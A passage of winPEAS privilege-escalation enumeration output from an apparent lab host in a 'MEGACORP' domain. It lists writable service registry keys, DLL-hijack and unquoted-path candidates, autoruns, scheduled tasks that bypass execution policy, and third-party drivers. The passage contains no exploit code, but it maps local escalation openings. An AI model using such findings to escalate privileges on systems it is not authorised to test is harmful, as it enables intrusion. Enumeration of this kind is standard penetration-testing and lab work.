    HKLM\system\currentcontrolset\services\w3logsvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\W3SVC (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\WacomPen (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\WalletService (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\wanarp (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\wanarpv6 (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\WAS (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\WbioSrvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\wcifs (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\Wcmsvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\wcncsvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\wcnfs (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\WdBoot (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\Wdf01000 (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\WdFilter (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\WdNisDrv (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\WdNisSvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\Wecsvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\WEPHOSTSVC (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\wercplsupport (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\WerSvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\WFPLWFS (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\WiaRpc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\WIMMount (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\WinDefend (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\Windows Workflow Foundation 4.0.0.0 (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\WindowsTrustedRT (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\WindowsTrustedRTProxy (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\WinHttpAutoProxySvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\WinMad (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\WinNat (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\WinRM (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\Winsock (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\WinSock2 (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\WINUSB (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\WinVerbs (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\wisvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\WlanSvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\wlidsvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\WmiAcpi (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\Wof (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\workerdd (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\WPDBusEnum (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\WpdUpFltr (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\WpnService (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\WpnUserService (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\WpnUserService_4cbe7 (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\ws2ifsl (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\WSearch (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\WSearchIdxPi (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\wuauserv (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\WudfPf (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\WUDFRd (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\wudfsvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\WUDFWpdFs (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\XblAuthManager (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\XblGameSave (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\xboxgip (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\xinputhid (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\xmlprov (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\{0C874D59-764B-4A70-8041-0EABDAA6ABD5} (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\{271ED1C9-B9C1-4FFD-AD56-185C270F88EA} (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\{69F6C2D3-03D7-4BA2-A935-EEA0D5755840} (Server Operators [Allow: WriteKey GenericWrite])

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking write permissions in PATH folders (DLL Hijacking) (T1574.001)
È Check for DLL Hijacking in PATH folders https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#dll-hijacking
    C:\Windows\system32
    C:\Windows
    C:\Windows\System32\Wbem
    C:\Windows\System32\WindowsPowerShell\v1.0\
    C:\Program Files (x86)\Microsoft SQL Server\140\DTS\Binn\
    C:\Program Files\Microsoft SQL Server\140\DTS\Binn\
    C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\130\Tools\Binn\
    C:\Program Files (x86)\Microsoft SQL Server\140\Tools\Binn\
    C:\Program Files\Microsoft SQL Server\140\Tools\Binn\
    C:\Program Files\Microsoft\Web Platform Installer\

ÉÍÍÍÍÍÍÍÍÍÍ¹ OEM privileged utilities & risky components (T1068)
    None of the supported OEM utilities were detected.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Kernel drivers with weak/legacy signatures (T1014)
È Legacy cross-signed drivers (pre-July-2015) can still grant kernel execution on modern Windows https://research.checkpoint.com/2025/cracking-valleyrat-from-builder-secrets-to-kernel-rootkits/                                                                                                                       
  [X] Exception: Access denied 
È   Unable to enumerate kernel services

ÉÍÍÍÍÍÍÍÍÍÍ¹ KernelQuick / ValleyRAT rootkit indicators (T1014)
È   No KernelQuick-specific registry indicators were found


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ .NET SOAP Client Proxies (SOAPwn) (T1559,T1071.001) ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ Potential SOAPwn / HttpWebClientProtocol abuse surfaces (T1559,T1071.001)
È Look for .NET services that let attackers control SoapHttpClientProtocol URLs or WSDL imports to coerce NTLM or drop files. https://labs.watchtowr.com/soapwn-pwning-net-framework-applications-through-http-client-proxies-and-wsdl/                                                                                 
Error while enumerating services for SOAP client analysis: Invalid parameter 
  [X] Exception: Access denied 
    Not Found


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Applications Information (T1518,T1547.001,T1053.005,T1010,T1014) ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ Current Active Window Application (T1010)
  [X] Exception: Object reference not set to an instance of an object.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Installed Applications --Via Program Files/Uninstall registry-- (T1518)
È Check if you can modify installed software https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#applications
    C:\Program Files\Common Files
    C:\Program Files\desktop.ini
    C:\Program Files\Internet Explorer
    C:\Program Files\Microsoft
    C:\Program Files\Microsoft SQL Server
    C:\Program Files\Microsoft Visual Studio 10.0
    C:\Program Files\Microsoft VS Code
    C:\Program Files\Microsoft.NET
    C:\Program Files\Reference Assemblies
    C:\Program Files\Uninstall Information
    C:\Program Files\VMware
    C:\Program Files\Windows Defender
    C:\Program Files\Windows Mail
    C:\Program Files\Windows Media Player
    C:\Program Files\Windows Multimedia Platform
    C:\Program Files\Windows NT
    C:\Program Files\Windows Photo Viewer
    C:\Program Files\Windows Portable Devices
    C:\Program Files\Windows Sidebar
    C:\Program Files\WindowsApps
    C:\Program Files\WindowsPowerShell


ÉÍÍÍÍÍÍÍÍÍÍ¹ Autorun Applications (T1547.001)
È Check if you can modify other users AutoRuns binaries (Note that is normal that you can modify HKCU registry and binaries indicated there) https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries.html                                       
Error getting autoruns from WMIC: System.Management.ManagementException: Access denied
   at System.Management.ThreadDispatch.Start()                                                                                                              
   at System.Management.ManagementScope.Initialize()                                                                                                        
   at System.Management.ManagementObjectSearcher.Initialize()                                                                                               
   at System.Management.ManagementObjectSearcher.Get()                                                                                                      
   at winPEAS.Info.ApplicationInfo.AutoRuns.GetAutoRunsWMIC()                                                                                               

    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Run
    Key: VMware VM3DService Process
    Folder: C:\Windows\system32
    File: C:\Windows\system32\vm3dservice.exe -u
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Run
    Key: VMware User Process
    Folder: C:\Program Files\VMware\VMware Tools
    File: C:\Program Files\VMware\VMware Tools\vmtoolsd.exe -n vmusr (Unquoted and Space detected) - C:\
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
    Key: Common Startup
    Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders
    Key: Common Startup
    Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
    Key: Userinit
    Folder: C:\Windows\system32
    File: C:\Windows\system32\userinit.exe,
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
    Key: Shell
    Folder: None (PATH Injection)
    File: explorer.exe
   =================================================================================================


    RegPath: HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot
    RegPerms: Server Operators [Allow: WriteKey GenericWrite]
    Key: AlternateShell
    Folder: None (PATH Injection)
    File: cmd.exe
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Font Drivers
    Key: Adobe Type Manager
    Folder: None (PATH Injection)
    File: atmfd.dll
   =================================================================================================


    RegPath: HKLM\Software\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers
    Key: Adobe Type Manager
    Folder: None (PATH Injection)
    File: atmfd.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: midimapper
    Folder: None (PATH Injection)
    File: midimap.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.imaadpcm
    Folder: None (PATH Injection)
    File: imaadp32.acm
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.l3acm
    Folder: C:\Windows\System32
    File: C:\Windows\System32\l3codeca.acm
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msadpcm
    Folder: None (PATH Injection)
    File: msadp32.acm
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msg711
    Folder: None (PATH Injection)
    File: msg711.acm
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msgsm610
    Folder: None (PATH Injection)
    File: msgsm32.acm
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.i420
    Folder: None (PATH Injection)
    File: iyuv_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.iyuv
    Folder: None (PATH Injection)
    File: iyuv_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.mrle
    Folder: None (PATH Injection)
    File: msrle32.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.msvc
    Folder: None (PATH Injection)
    File: msvidc32.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.uyvy
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yuy2
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yvu9
    Folder: None (PATH Injection)
    File: tsbyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yvyu
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: wavemapper
    Folder: None (PATH Injection)
    File: msacm32.drv
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: midimapper
    Folder: None (PATH Injection)
    File: midimap.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.imaadpcm
    Folder: None (PATH Injection)
    File: imaadp32.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.l3acm
    Folder: C:\Windows\SysWOW64
    File: C:\Windows\SysWOW64\l3codeca.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msadpcm
    Folder: None (PATH Injection)
    File: msadp32.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msg711
    Folder: None (PATH Injection)
    File: msg711.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msgsm610
    Folder: None (PATH Injection)
    File: msgsm32.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.cvid
    Folder: None (PATH Injection)
    File: iccvid.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.i420
    Folder: None (PATH Injection)
    File: iyuv_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.iyuv
    Folder: None (PATH Injection)
    File: iyuv_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.mrle
    Folder: None (PATH Injection)
    File: msrle32.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.msvc
    Folder: None (PATH Injection)
    File: msvidc32.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.uyvy
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yuy2
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yvu9
    Folder: None (PATH Injection)
    File: tsbyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yvyu
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: wavemapper
    Folder: None (PATH Injection)
    File: msacm32.drv
   =================================================================================================


    RegPath: HKLM\Software\Classes\htmlfile\shell\open\command
    Folder: C:\Program Files\Internet Explorer
    File: C:\Program Files\Internet Explorer\iexplore.exe %1 (Unquoted and Space detected) - C:\
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: _Wow64
    Folder: None (PATH Injection)
    File: Wow64.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: _Wow64cpu
    Folder: None (PATH Injection)
    File: Wow64cpu.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: _Wow64win
    Folder: None (PATH Injection)
    File: Wow64win.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: advapi32
    Folder: None (PATH Injection)
    File: advapi32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: clbcatq
    Folder: None (PATH Injection)
    File: clbcatq.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: combase
    Folder: None (PATH Injection)
    File: combase.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: COMDLG32
    Folder: None (PATH Injection)
    File: COMDLG32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: coml2
    Folder: None (PATH Injection)
    File: coml2.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: DifxApi
    Folder: None (PATH Injection)
    File: difxapi.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: gdi32
    Folder: None (PATH Injection)
    File: gdi32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: gdiplus
    Folder: None (PATH Injection)
    File: gdiplus.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: IMAGEHLP
    Folder: None (PATH Injection)
    File: IMAGEHLP.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: IMM32
    Folder: None (PATH Injection)
    File: IMM32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: kernel32
    Folder: None (PATH Injection)
    File: kernel32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: LPK
    Folder: None (PATH Injection)
    File: LPK.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: MSCTF
    Folder: None (PATH Injection)
    File: MSCTF.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: MSVCRT
    Folder: None (PATH Injection)
    File: MSVCRT.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: NORMALIZ
    Folder: None (PATH Injection)
    File: NORMALIZ.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: NSI
    Folder: None (PATH Injection)
    File: NSI.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: ole32
    Folder: None (PATH Injection)
    File: ole32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: OLEAUT32
    Folder: None (PATH Injection)
    File: OLEAUT32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: PSAPI
    Folder: None (PATH Injection)
    File: PSAPI.DLL
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: rpcrt4
    Folder: None (PATH Injection)
    File: rpcrt4.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: sechost
    Folder: None (PATH Injection)
    File: sechost.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: Setupapi
    Folder: None (PATH Injection)
    File: Setupapi.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: SHELL32
    Folder: None (PATH Injection)
    File: SHELL32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: SHLWAPI
    Folder: None (PATH Injection)
    File: SHLWAPI.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: user32
    Folder: None (PATH Injection)
    File: user32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: WLDAP32
    Folder: None (PATH Injection)
    File: WLDAP32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: WS2_32
    Folder: None (PATH Injection)
    File: WS2_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{2C7339CF-2B09-4501-B3F3-F3508C9228ED}
    Key: StubPath
    Folder: \
    FolderPerms: Users [Allow: AppendData/CreateDirectories]
    File: /UserInstall
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{44BBA840-CC51-11CF-AAFA-00AA00B6015C}
    Key: StubPath
    Folder: C:\Program Files\Windows Mail
    File: C:\Program Files\Windows Mail\WinMail.exe OCInstallUserConfigOE (Unquoted and Space detected) - C:\
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{6BF52A52-394A-11d3-B153-00C04F79FAA6}
    Key: StubPath
    Folder: C:\Windows\system32
    File: C:\Windows\system32\unregmp2.exe /FirstLogon
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{89820200-ECBD-11cf-8B85-00AA005B4340}
    Key: StubPath
    Folder: None (PATH Injection)
    File: U
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{89820200-ECBD-11cf-8B85-00AA005B4383}
    Key: StubPath
    Folder: C:\Windows\System32
    File: C:\Windows\System32\ie4uinit.exe -UserConfig
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{89B4C1CD-B018-4511-B0A1-5476DBF70820}
    Key: StubPath
    Folder: C:\Windows\System32
    File: C:\Windows\System32\Rundll32.exe C:\Windows\System32\mscories.dll,Install
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{A509B1A7-37EF-4b3f-8CFC-4F3A74704073}
    Key: StubPath
    Folder: C:\Windows\System32
    File: C:\Windows\System32\rundll32.exe C:\Windows\System32\iesetup.dll,IEHardenAdmin
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{A509B1A8-37EF-4b3f-8CFC-4F3A74704073}
    Key: StubPath
    Folder: C:\Windows\System32
    File: C:\Windows\System32\rundll32.exe C:\Windows\System32\iesetup.dll,IEHardenUser
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Active Setup\Installed Components\{44BBA840-CC51-11CF-AAFA-00AA00B6015C}
    Key: StubPath
    Folder: C:\Program Files\Windows Mail
    File: C:\Program Files\Windows Mail\WinMail.exe OCInstallUserConfigOE (Unquoted and Space detected) - C:\
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Active Setup\Installed Components\{6BF52A52-394A-11d3-B153-00C04F79FAA6}
    Key: StubPath
    Folder: C:\Windows\system32
    File: C:\Windows\system32\unregmp2.exe /FirstLogon
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Active Setup\Installed Components\{89B4C1CD-B018-4511-B0A1-5476DBF70820}
    Key: StubPath
    Folder: C:\Windows\SysWOW64
    File: C:\Windows\SysWOW64\Rundll32.exe C:\Windows\SysWOW64\mscories.dll,Install
   =================================================================================================


    Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
    File: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini
    Potentially sensitive file content: LocalizedResourceName=@%SystemRoot%\system32\shell32.dll,-21787
   =================================================================================================


    Folder: C:\windows\tasks
    FolderPerms: Authenticated Users [Allow: WriteData/CreateFiles]
   =================================================================================================


    Folder: C:\windows\system32\tasks
    FolderPerms: Authenticated Users [Allow: WriteData/CreateFiles]
   =================================================================================================


    Folder: C:\windows
    File: C:\windows\system.ini
   =================================================================================================


    Folder: C:\windows
    File: C:\windows\win.ini
   =================================================================================================


ÉÍÍÍÍÍÍÍÍÍÍ¹ Scheduled Applications --Non Microsoft-- (T1053.005)
È Check if you can modify other users scheduled binaries https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries.html                                                                                                                           
    (ExplorerShellUnelevated) CreateExplorerShellUnelevatedTask: C:\Windows\Explorer.EXE /NOUACCHECK
    Trigger: When the task is created or modified

   =================================================================================================

    (MEGACORP\administrator) Revert: C:\Users\Administrator\Documents\SharpView.exe Set-DomainObject -Identity Jorden -Clear serviceprincipalname
    Trigger: At 3:18 PM on 1/9/2020-After triggered, repeat every 00:02:00 indefinitely.

   =================================================================================================

    (MEGACORP\administrator) Revert2: cmd.exe /c sc.exe config browser binpath= "C:\Windows\System32\svchost.exe -k smbsvcs"
    Trigger: At 4:31 PM on 1/9/2020-After triggered, repeat every 00:02:00 indefinitely.

   =================================================================================================

    (MEGACORP\Administrator) vscode: powershell.exe -ep bypass -nop C:\Users\cyork\Desktop\Code.lnk
    Trigger: At 12:00 AM on 1/9/2020-After triggered, repeat every 00:02:00 indefinitely.

   =================================================================================================

    (MEGACORP\administrator) vscode_2: cmd.exe /c taskkill /F /IM code.exe
    Trigger: At 12:46 PM on 1/9/2020-After triggered, repeat every 00:10:00 indefinitely.

   =================================================================================================


ÉÍÍÍÍÍÍÍÍÍÍ¹ Device Drivers --Non Microsoft-- (T1014)
È Check 3rd party drivers for known vulnerabilities/rootkits. https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#drivers                                                                                                                                                   
    QLogic Gigabit Ethernet - 7.12.31.105 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\bxvbda.sys
    QLogic 10 GigE - 7.13.65.105 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\evbda.sys
    VMware vSockets Service - 9.8.16.0 build-14168184 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vsock.sys
    NVIDIA nForce(TM) RAID Driver - 10.6.0.23 [NVIDIA Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\nvraid.sys
    VMware PCI VMCI Bus Device - 9.8.16.0 build-14168184 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vmci.sys
    Intel Matrix Storage Manager driver - 8.6.2.1019 [Intel Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\iaStorV.sys
    VIA StorX RAID Controller Driver - 8.0.9200.8110 [VIA Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vstxraid.sys
    LSI 3ware RAID Controller - WindowsBlue [LSI]: \\.\GLOBALROOT\SystemRoot\System32\drivers\3ware.sys
    AHCI 1.3 Device Driver - 1.1.3.277 [Advanced Micro Devices]: \\.\GLOBALROOT\SystemRoot\System32\drivers\amdsata.sys
